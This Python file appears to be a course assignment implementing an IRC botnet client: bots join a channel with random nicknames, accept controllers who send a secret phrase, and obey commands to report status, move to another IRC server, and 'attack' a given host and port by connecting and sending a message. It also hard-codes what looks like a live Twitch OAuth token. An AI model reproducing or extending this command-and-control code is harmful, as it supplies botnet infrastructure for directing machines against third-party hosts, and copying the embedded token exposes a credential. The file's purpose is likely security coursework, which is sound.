import socket
import time
import sys
import random, string
import irc
import check

HOST = "irc.twitch.tv"              # the Twitch IRC server
PORT = 6667                         # always use port 6667!
NICK = "cpsc526bot"            # your Twitch username, lowercase
PASS = "oauth:ust447elexk8yx2b4jrhm1nhjcxw8r" # your Twitch OAuth token
CHAN = "#cpsc526bot"                   # the channel you want to join
COUNTER = 1                            # global attack Counter
AUTHENTICATED_CONTROLLERS = []

def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
       raise IRCBadMessageError("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)
    return prefix, command, args

def check_move(line):

    if(len(line) < 4):
        return False

    if(not check.hostname(line[1])):
        return False

    if(not check.port(line[2])):
        return False

    if(not check.connection(line[1], line[2])):
        return False

    return True

def move(s, sender, host, port, chan):
    global HOST, PORT, CHAN
    HOST = host
    PORT = int(port)
    CHAN = chan
    s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : moved to new IRC SERVER\r\n', 'utf-8'))
    s.send("QUIT\r\n".format(CHAN).encode("utf-8"))

#takes in a list
def check_attack(line):

    #must have at least 3 elements
    if(len(line) < 3):
        return False

    #checks hostname
    if(not check.hostname(line[1])):
        return False

    #checks valid port
    if(not check.port(line[2])):
        return False    

    if(not check.connection(line[1], line[2])):
        return False

    return True

def attack(s, sender, host, port):
    global COUNTER
    attack_socket = socket.socket()
    try:
        attack_socket.connect((host, port))
        attack_socket.send(bytearray('ATTACK COUNTER: ' + str(COUNTER) + ' BOT NAME: ' + NICK + '\n', 'utf-8'))
        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ': attack success\r\n', 'utf-8'))
        COUNTER = COUNTER + 1
    except:
        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : attack failed\r\n', 'utf-8'))



# returns random 5 char string
def generate_nickname(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def privmsg(destination, msg):
    ret = "PRIVMSG "+destination+" :"+msg+"\r\n"
    return ret

if __name__ == "__main__":

    if len(sys.argv) == 5:
        
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        CHAN = sys.argv[3]
        PASS = sys.argv[4]
        NICK = 'bot_'+generate_nickname(5)

        s = socket.socket()
        
        while True:
            try:
                s.connect((HOST, PORT))
                s.send("PASS {}\r\n".format(PASS).encode("utf-8"))
                s.send("NICK {}\r\n".format(NICK).encode("utf-8"))
                s.send("USER b 0 * :{}\r\n".format(NICK).encode("utf-8"))
                s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))

                print("Connected to IRC with nickname "+NICK+"...")

                while True:
                    response = s.recv(1024).decode("utf-8")

                    if 'PING' in response:
                        print(response)
                        msg = response.split(':')
                        print('PONG '+msg[1]+'\r\n')
                        s.send(('PONG '+msg[1]+'\r\n').encode("utf-8"))
                    else:

                        # args[1].strip() = message
                        (prefix, command, args)= parsemsg(response)
                        sender = prefix.split("!")[0]
                        print("Sender: "+sender)
                        # debug msgs
                        print("prefix: " + prefix)
                        print("command: " + command)
                        for p in args: print ("arg["+p.strip()+"]") 

                        # if nickname already in use
                        if command == "433":
                            NICK = 'bot_'+generate_nickname(5)
                            s.send(("NICK "+NICK+"\r\n").encode('utf-8'))
                        
                        # if privmsg
                        elif command == "PRIVMSG":
                            
                            # from channel
                            if args[0] == CHAN and args[1].strip() == "!saysomething":
                                    s.send("PRIVMSG {} :Im a new message\r\n".format(CHAN).encode("utf-8"))
                                    print("PRIVMSG {} :Im a new message\r\n".format(CHAN).encode("utf-8"))
                            elif args[0] == CHAN and args[1].strip() == "!quit":
                                    s.send("PRIVMSG {} : "+NICK+ " out!\r\n".format(CHAN).encode("utf-8"))
                                    print(NICK + " out!")
                                    break
                            # from other users
                            elif sender not in AUTHENTICATED_CONTROLLERS and args[1].strip() == PASS:
                                AUTHENTICATED_CONTROLLERS.append(sender)
                                print(sender + " is an authenticated controller!")
                            elif sender in AUTHENTICATED_CONTROLLERS:
                                print("Message received from a controller...")
                                
                                if "status" in args[1].strip():
                                    s.send(privmsg(sender, NICK).encode('utf-8'))
                                    print("Sending "+privmsg(sender, NICK))
                            
                                #ryt now only check if it has move then it disconnects, then reconnects
                                elif 'move' in args[1]:
                                    arguments = args[1].split()
                                    print(arguments)
                                    if(check_move(arguments)):
                                        move(s, sender, arguments[1], arguments[2], arguments[3])
                                        break
                                    else:
                                        s.send(('PRIVMSG ' + sender + ' :' + NICK + ' : invalid move\r\n').encode('utf-8'))
                                
                                #should be working, has error checking too
                                elif 'attack' in args[1]:
                                    arguments = args[1].split()

                                    if(check_attack(arguments)): 
                                        attack(s, sender, arguments[1], int(arguments[2]))
                                    else:
                                        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : invalid attack\r\n', 'utf-8'))

                    #print(response)
                s.close()

            except socket.error as e:
                print("{0}".format(e))
                print("Sleeping...")
                # If connection fails, sleep for 5s then connect again 
                time.sleep(5)
                #create new socket since we closed the old one
                s = socket.socket()
                continue
    else:
        print("USAGE: python3 bot.py <hostname> <port> <channel> <secret-phrase>")
        sys.exit(1)
